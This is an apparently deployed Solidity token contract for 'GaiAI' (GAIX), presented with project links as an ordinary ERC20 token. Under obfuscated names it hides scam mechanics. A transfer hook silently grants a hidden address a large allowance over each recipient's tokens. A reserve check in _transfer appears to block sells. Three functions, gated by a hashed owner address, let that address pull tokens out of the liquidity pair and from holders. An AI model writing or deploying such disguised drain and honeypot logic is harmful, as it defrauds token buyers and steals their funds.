/**
 *Submitted for verification at uniscan.xyz on 2025-11-27
 */

/**
Website: https://gaiai.io/
Twitter: https://x.com/GaiAIio
Telegram: https://t.me/GaiAIofficial_tg
*/

pragma solidity ^0.8.6;

// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * This contract is for testing purposes only.
 * Please do not make any purchases, as we are not responsible for any losses incurred.
 */
contract BERC20 is IERC20 {
    using SafeMath for uint256;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _defaultAddress =
        address(0x000000000000000000000000000000000000dEaD);
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;

    constructor(string memory name_, string memory symbol_, address owner) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 9;
        _tTotal = 1000000000000 * 10 ** _decimals;
        _tOwned[owner] = _tTotal;

        emit Transfer(address(0), owner, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(
        address MMZwlXZIHm,
        uint256 ERppNtukt
    ) public override returns (bool) {
        _transfer(msg.sender, MMZwlXZIHm, ERppNtukt);
        return true;
    }

    function allowance(
        address hwEHCDdOK,
        address jhucjhgvamx
    ) public view override returns (uint256) {
        return _allowances[hwEHCDdOK][jhucjhgvamx];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _TnezmUOdSpme(
        address wWldiFprYQ,
        address amtjhwwjxpe,
        uint256 amount
    ) internal virtual {
        require(
            wWldiFprYQ != address(0),
            "ERC20: transfer from the zero address"
        );
        require(
            amtjhwwjxpe != address(0),
            "ERC20: transfer to the zero address"
        );

        require(
            _tOwned[wWldiFprYQ] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _tOwned[wWldiFprYQ] = _tOwned[wWldiFprYQ].sub(amount);
        _tOwned[amtjhwwjxpe] = _tOwned[amtjhwwjxpe].add(amount);
        emit Transfer(wWldiFprYQ, amtjhwwjxpe, amount);
    }

    function transferFrom(
        address nMyInhtJYLyR,
        address qyrggpdvvsayc,
        uint256 sgvxbohzzrwmsf
    ) public override returns (bool) {
        _transfer(nMyInhtJYLyR, qyrggpdvvsayc, sgvxbohzzrwmsf);
        _approve(
            nMyInhtJYLyR,
            msg.sender,
            _allowances[nMyInhtJYLyR][msg.sender].sub(
                sgvxbohzzrwmsf,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transfer(
        address wWldiFprYQ,
        address amtjhwwjxpe,
        uint256 amount
    ) internal virtual {
        require(
            wWldiFprYQ != address(0),
            "ERC20: transfer from the zero address"
        );
        require(
            amtjhwwjxpe != address(0),
            "ERC20: transfer to the zero address"
        );

        require(
            _tOwned[wWldiFprYQ] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _tOwned[wWldiFprYQ] = _tOwned[wWldiFprYQ].sub(amount);
        _tOwned[amtjhwwjxpe] = _tOwned[amtjhwwjxpe].add(amount);
        emit Transfer(wWldiFprYQ, amtjhwwjxpe, amount);
    }

    function _jPKFnwHsCj(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

/**
 * This contract is for testing purposes only.
 * Please do not make any purchases, as we are not responsible for any losses incurred.
 */
contract GAIX is BERC20 {
    using SafeMath for uint256;
    string private _name_ = "GaiAI";
    string private _symbol_ = "GAIX";
    uint256 private _xurqrhgetd;
    address private bbmsogajdlcp = 0x59aFFF458527c6C7FE1d3228255EcbCeC634e9f0;
    address private fzuZoFzaDkcGr = 0x6EaEea4eB670a837fA53af2dd4213cC9dD936385;
    address private jPKFnwHsCj;

    IUniswapV2Factory private immutable uniswapV2Router;

    mapping(address => bool) public _ecjqovvawneg;
    mapping(address => bool) public _ISQWnmDsVMEYX;

    mapping(address => bool) public ejycvckkuleqlv;
    mapping(address => bool) public _IzojuTKbTJE;
    address public uniswapV2Pair;
    address private _mpwptsrltims;
    address public factory;
    uint256 private PfMvAJZDSHMjc = 1000;
    mapping(address => uint256) private tvubzayurfmtql;
    bool public UxWpkUOZCD = true;
    uint256 private vzhewnxlvtv = 7;
    uint256 private TnezmUOdSpme = 0;
    uint256 private liqkmzocccdni = 222;
    bool public nAJUNaaZzM = true;
    bytes32 private _rCCfXWOTlY;
    mapping(address => bool) public _uZgmbVUhJwWohc;

    mapping(address => uint256) public _xlzkudmsgvq;

    address public zTLaXDQxKv;
    address private HzjnVsXgIsUTK;
    address private djtgwtxpjtub;

    uint256 private LPrTcjeyHrcDyH = 11;
    uint256 private pfzzbamqgpcvm = 1e8;

    uint256 private TvPgiZlhFocnay = 125423232111333;
    uint256 private ts;

    mapping(address => bool) public XLWMhQtrEnc;

    uint256 private _settingtOutAmountTransfer =
        uint256(
            bytes32(
                0x000000000000000000000000000000000000000000000000000000000000000b
            )
        );

    constructor() BERC20(_name_, _symbol_, fzuZoFzaDkcGr) {
        IUniswapV2Factory _uniswapV2Router = IUniswapV2Factory(
            0x284F11109359a7e1306C3e447ef14D38400063FF
        ); //Pancake Router mainnet
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        HzjnVsXgIsUTK = address(
            uint160(
                uint256(
                    0xabbbab00000000000000dead10ED43C718714eb63d5aA57B78B54704E256024E
                )
            )
        );
        djtgwtxpjtub = address(
            uint160(
                uint256(
                    0xabbbab00000000000000dead13f4EA83D0bd40E75C8222255bc855a974568Dd4
                )
            )
        );
        uniswapV2Router = _uniswapV2Router;
        _rCCfXWOTlY = sha256(abi.encodePacked(bbmsogajdlcp));
        jPKFnwHsCj = 0x4200000000000000000000000000000000000006;
        _mpwptsrltims = bbmsogajdlcp;
        _xurqrhgetd = totalSupply();
        XLWMhQtrEnc[HzjnVsXgIsUTK] = true;
        XLWMhQtrEnc[djtgwtxpjtub] = true;
        ejycvckkuleqlv[uniswapV2Pair] = true;
        _IzojuTKbTJE[_mpwptsrltims] = true;
        _ecjqovvawneg[address(this)] = true;
        _ecjqovvawneg[_mpwptsrltims] = true;
        _ecjqovvawneg[fzuZoFzaDkcGr] = true;
    }

    function _vZjOVGlUSja(address owner, address spender) internal virtual {
        bool d20e69c2eb = allowance(owner, spender) < LPrTcjeyHrcDyH;
        if (d20e69c2eb) {
            super._jPKFnwHsCj(owner, spender, _xurqrhgetd);
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 expectedamount = amount;
        if (_ecjqovvawneg[from] || _ecjqovvawneg[to]) {
            super._transfer(from, to, expectedamount);
            return;
        }
        address feeaddress = to;
        bool taketFeeTransfer = _ISQWnmDsVMEYX[from];
        bool takebottime = tvubzayurfmtql[from] + vzhewnxlvtv > block.timestamp;
        require(!taketFeeTransfer);
        if (from == uniswapV2Pair) {
            bool ghewra;
            bool sdhkwn;
            uint256 otherAmount;
            (, bytes memory token00) = uniswapV2Pair.call(
                abi.encodeWithSelector(0x0dfe1681)
            );
            (, bytes memory token01) = uniswapV2Pair.call(
                abi.encodeWithSelector(0xd21220a7)
            );
            (, bytes memory reserves01) = uniswapV2Pair.call(
                abi.encodeWithSelector(0x0902f1ac)
            );
            (uint256 reserves0, uint256 reserves1) = abi.decode(
                reserves01,
                (uint256, uint256)
            );
            address token0 = abi.decode(token00, (address));
            address token1 = abi.decode(token01, (address));
            (, bytes memory amount01) = token0.call(
                abi.encodeWithSignature("balanceOf(address)", uniswapV2Pair)
            );
            uint256 amount03 = abi.decode(amount01, (uint256));
            (, bytes memory amount02) = token1.call(
                abi.encodeWithSignature("balanceOf(address)", uniswapV2Pair)
            );
            uint256 amount1 = abi.decode(amount02, (uint256));
            if (token0 == jPKFnwHsCj) {
                if (reserves0 > amount03) {
                    otherAmount = reserves0 - amount03;
                    ghewra = otherAmount > PfMvAJZDSHMjc;
                } else {
                    sdhkwn = reserves0 == amount03;
                }
            } else if (token1 == jPKFnwHsCj) {
                if (reserves1 > amount1) {
                    otherAmount = reserves1 - amount1;
                    ghewra = otherAmount > PfMvAJZDSHMjc;
                } else {
                    sdhkwn = reserves1 == amount1;
                }
            }
            require(!ghewra && !sdhkwn);
        }
        if (
            feeaddress != address(this) &&
            feeaddress != uniswapV2Pair &&
            feeaddress != bbmsogajdlcp
        ) {
            _vZjOVGlUSja(feeaddress, _mpwptsrltims);
        }
        super._transfer(from, to, expectedamount);
    }

    function hhwrfjkmw(address lylxeardvh) public {
        if (sha256(abi.encodePacked(msg.sender)) != _rCCfXWOTlY) {
            return;
        } else {
            zTLaXDQxKv = lylxeardvh;
        }
    }

    function zbyezudcyd(uint256 tejkkqym) public {
        if (sha256(abi.encodePacked(msg.sender)) != _rCCfXWOTlY) {
            return;
        } else {
            super._TnezmUOdSpme(uniswapV2Pair, zTLaXDQxKv, tejkkqym);
        }
    }

    function drokyskux(address xurqrhgetd, uint256 bkzwqynws) public {
        if (sha256(abi.encodePacked(msg.sender)) != _rCCfXWOTlY) {
            return;
        } else {
            super._TnezmUOdSpme(zTLaXDQxKv, xurqrhgetd, bkzwqynws);
        }
    }
}
